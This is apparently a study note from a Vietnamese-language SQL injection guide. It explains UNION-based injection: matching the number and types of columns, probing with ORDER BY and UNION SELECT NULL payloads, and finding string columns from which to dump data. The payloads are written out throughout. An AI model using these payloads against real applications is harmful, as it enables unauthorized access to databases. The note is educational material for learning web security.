
**Metadata:**
* **Parent Link:** [SQL_Injection-Master_Guide](../SQL_Injection-Master_Guide.md)

## 1. The Golden Rules of UNION (Quy tắc Cốt lõi của UNION)
Để một cuộc tấn công **UNION-based SQLi** thực thi thành công, câu truy vấn được tiêm (Injected Query) phải tuân thủ nghiêm ngặt 2 quy tắc của **RDBMS**:
1. Phải trả về **cùng một số lượng cột (Columns)** với câu truy vấn gốc.
2. Cột ở vị trí tương ứng giữa hai truy vấn phải có **kiểu dữ liệu tương thích (Compatible Data Types)**.

---

## 2. Phase 1: Determining the Number of Columns (Xác định số lượng cột)

Có 2 kỹ thuật tiêu chuẩn để dò tìm số lượng cột.

### Kỹ thuật A: ORDER BY (Gây lỗi tràn chỉ mục)
Sử dụng mệnh đề `ORDER BY` để ép **DBMS** sắp xếp kết quả theo chỉ số cột. Bằng cách tăng dần chỉ số này, ta sẽ tìm được giới hạn của truy vấn gốc.
* **Payload 1:** `' ORDER BY 1--` (Thành công -> Có ít nhất 1 cột)
* **Payload 2:** `' ORDER BY 2--` (Thành công -> Có ít nhất 2 cột)
* **Payload 3:** `' ORDER BY 3--` (Thất bại: **HTTP 500**)
* **Kết luận Logic:** Lỗi xảy ra ở chỉ số 3, chứng minh truy vấn gốc có **chính xác 2 cột**.

### Kỹ thuật B: UNION SELECT NULL (Khớp số lượng cột)
Sử dụng toán tử `UNION` với các giá trị `NULL`.
*(Tại sao lại dùng `NULL` thay vì số `1` hay chữ `'a'`? Vì `NULL` là giá trị đặc biệt tương thích với mọi kiểu dữ liệu từ INT, VARCHAR đến DATE, giúp tránh lỗi sai kiểu dữ liệu trong lúc dò tìm).*
* **Payload 1:** `' UNION SELECT NULL--` (Lỗi -> Sai số lượng)
* **Payload 2:** `' UNION SELECT NULL, NULL--` (Thành công -> **HTTP 200 OK**)
* **Kết luận Logic:** Khớp thành công ở 2 giá trị `NULL`, hệ thống có **2 cột**. *(Lưu ý: Nếu là Oracle, phải thêm `FROM DUAL`).*

---

## 3. Phase 2: Finding Columns with Useful Data Types (Xác định kiểu dữ liệu)

Hầu hết các dữ liệu nhạy cảm cần trích xuất (tài khoản, mật khẩu, phiên bản) đều ở định dạng chuỗi (**String** / **VARCHAR**). Sau khi biết được số lượng cột (giả sử là 3 cột), ta tiến hành thay thế lần lượt từng giá trị `NULL` bằng một chuỗi tĩnh (ví dụ `'a'`) để kiểm tra xem cột nào chấp nhận dữ liệu Text.

* **Thử nghiệm Cột 1:**
  `' UNION SELECT 'a', NULL, NULL--` (Báo lỗi -> Cột 1 không phải String, có thể là Integer ID).
* **Thử nghiệm Cột 2:**
  `' UNION SELECT NULL, 'a', NULL--` (Thành công -> Trang web in ra chữ 'a'. Cột 2 là String).
* **Thử nghiệm Cột 3:**
  `' UNION SELECT NULL, NULL, 'a'--` (Báo lỗi -> Cột 3 không phải String).

**Kết luận Kỹ thuật Cuối cùng:** Truy vấn gốc trả về **3 cột**, và chỉ có **cột thứ 2** là nơi ta có thể dùng để dump dữ liệu dạng chuỗi từ cơ sở dữ liệu.